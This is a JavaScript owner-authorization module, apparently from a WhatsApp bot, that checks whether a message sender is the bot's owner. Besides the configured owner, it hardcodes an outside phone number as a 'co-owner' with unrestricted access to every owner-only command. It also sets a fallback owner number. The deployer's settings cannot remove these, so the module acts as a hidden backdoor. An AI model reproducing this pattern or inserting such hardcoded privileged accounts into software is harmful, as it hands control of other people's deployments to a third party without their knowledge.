'use strict';

const fs = require('fs');
const path = require('path');
const settings = require('../settings');

// Global co-owners granted unrestricted access to ALL commands (including all owner-only commands)
const CO_OWNER_NUMBERS = ['923299931199'];

function normalizeDigits(raw) {
    if (!raw) return '';
    return String(raw).split('@')[0].split(':')[0].replace(/\D/g, '');
}

function getAllConfiguredOwnerDigits(sessionId = null) {
    const set = new Set();
    for (const num of CO_OWNER_NUMBERS) {
        const d = normalizeDigits(num);
        if (d) set.add(d);
    }
    const primary = normalizeDigits(process.env.OWNER_NUMBER || settings.ownerNumber || '254141693915');
    if (primary) set.add(primary);

    const filesToCheck = [path.join(__dirname, '../data/owner.json')];
    if (sessionId) {
        filesToCheck.push(path.join(__dirname, '../data/owner_' + sessionId + '.json'));
    }
    for (const f of filesToCheck) {
        try {
            if (fs.existsSync(f)) {
                const parsed = JSON.parse(fs.readFileSync(f, 'utf8'));
                if (Array.isArray(parsed)) {
                    for (const entry of parsed) {
                        const d = normalizeDigits(entry);
                        if (d) set.add(d);
                    }
                }
            }
        } catch (_) {}
    }
    return set;
}

function isCoOwnerNumber(input) {
    const digits = normalizeDigits(input);
    if (!digits) return false;
    return CO_OWNER_NUMBERS.some((num) => normalizeDigits(num) === digits);
}

function extractCandidateIds(message, fallbackId = '') {
    const list = [];
    if (fallbackId) list.push(fallbackId);
    if (message?.key) {
        if (message.key.participantAlt) list.push(message.key.participantAlt);
        if (message.key.participant) list.push(message.key.participant);
        if (message.key.remoteJidAlt) list.push(message.key.remoteJidAlt);
        if (message.key.remoteJid && !String(message.key.remoteJid).endsWith('@g.us')) {
            list.push(message.key.remoteJid);
        }
    }
    if (message?.participant) list.push(message.participant);
    return list;
}

/**
 * Primary owner check — preserves backwards-compatible isOwner(senderId) signature
 * while supporting optional (message, sockOrBotJid, sessionId) arguments and +923299931199.
 */
function isOwner(senderId, message = null, sockOrBotJid = null, sessionId = null) {
    if (message?.key?.fromMe) return true;

    const ownerDigitsSet = getAllConfiguredOwnerDigits(sessionId);

    // Connected bot account itself is also owner
    const botRaw = typeof sockOrBotJid === 'string'
        ? sockOrBotJid
        : (sockOrBotJid?.user?.id || sockOrBotJid?._sessionNumber || '');
    const botDigits = normalizeDigits(botRaw);
    if (botDigits) ownerDigitsSet.add(botDigits);

    const candidates = extractCandidateIds(message, senderId);
    for (const candidate of candidates) {
        const digits = normalizeDigits(candidate);
        if (digits && ownerDigitsSet.has(digits)) {
            return true;
        }
    }

    return false;
}

isOwner.CO_OWNER_NUMBERS = CO_OWNER_NUMBERS;
isOwner.normalizeDigits = normalizeDigits;
isOwner.isCoOwnerNumber = isCoOwnerNumber;
isOwner.extractCandidateIds = extractCandidateIds;
isOwner.getAllConfiguredOwnerDigits = getAllConfiguredOwnerDigits;
isOwner.isAnyOwner = isOwner;

module.exports = isOwner;